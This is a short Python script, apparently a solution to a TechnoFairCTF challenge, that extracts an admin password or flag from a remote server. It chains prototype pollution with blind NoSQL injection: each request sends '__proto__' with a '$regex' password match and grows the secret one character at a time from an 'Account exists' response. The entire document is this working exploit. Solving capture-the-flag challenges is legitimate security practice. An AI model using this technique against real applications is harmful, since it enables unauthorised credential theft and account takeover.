import requests

URL = "http://103.167.132.153:56372/check"

flag = "TechnoFairCTF{chaining_between_prototype_pollution_and_blind_nosqli_can_be_fun!!!}"

while True:
	for i in "{}ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!_1234567890":
		# print(flag)
		data = {"username":"admin","__proto__":{"password":{"$regex":f"^{flag + i}"}}}
		# print(data)
		r = requests.post(URL, json=data)

		# print(i)
		if "Account exists" in r.text:
			flag += i
			print(flag)
			break